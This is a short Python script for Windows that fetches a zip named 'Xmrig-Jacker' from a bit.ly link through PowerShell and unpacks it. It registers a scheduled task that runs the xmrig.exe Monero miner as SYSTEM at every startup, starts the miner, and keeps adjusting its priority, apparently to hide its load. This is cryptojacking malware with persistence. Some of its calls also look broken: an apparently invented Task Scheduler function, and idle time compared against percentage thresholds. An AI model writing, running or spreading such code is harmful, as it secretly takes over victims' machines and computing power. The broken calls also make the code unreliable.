import os
import subprocess
import shutil
import ctypes
import win32api
import time

def download_and_extract(url, output_dir):
    subprocess.run(["powershell", "Invoke-WebRequest", url, "-OutFile", os.path.join(output_dir, "Xmrig-Jacker-main.zip")])
    shutil.unpack_archive(os.path.join(output_dir, "Xmrig-Jacker-main.zip"), output_dir)

def set_process_priority(pid, priority):
    PROCESS_SET_INFORMATION = 0x0200
    handle = win32api.OpenProcess(PROCESS_SET_INFORMATION, False, pid)
    win32api.SetPriorityClass(handle, priority)
    win32api.CloseHandle(handle)

def main():
    temp_dir = "C:/temp"
    xmrig_path = os.path.join(temp_dir, "Xmrig-Jacker-main", "xmrig", "xmrig.exe")

    download_url = 'https://bit.ly/444WCb3'
    download_and_extract(download_url, temp_dir)

    action = f'"{xmrig_path}"'
    ctypes.windll.taskschd.TaskSchedulerSetSecurityDescriptor(None, 4)
    subprocess.run(["schtasks", "/Create", "/TN", "RunXmrig", "/SC", "ONSTART", "/RU", "SYSTEM", "/RL", "HIGHEST", "/TR", action])

    # Start the xmrig.exe process immediately
    subprocess.Popen([xmrig_path])

    process_name = "xmrig.exe"
    high_usage_threshold = 75
    low_usage_threshold = 25

    while True:
        cpu_usage = win32api.GetSystemTimes()[0]  # Get the idle time
        if cpu_usage >= high_usage_threshold:
            for proc in subprocess.check_output(["tasklist"]).splitlines():
                if process_name.encode() in proc:
                    pid = int(proc.split()[1])
                    set_process_priority(pid, win32api.IDLE_PRIORITY_CLASS)

        elif cpu_usage < low_usage_threshold:
            for proc in subprocess.check_output(["tasklist"]).splitlines():
                if process_name.encode() in proc:
                    pid = int(proc.split()[1])
                    set_process_priority(pid, win32api.NORMAL_PRIORITY_CLASS)

        time.sleep(5)

if __name__ == "__main__":
    main()
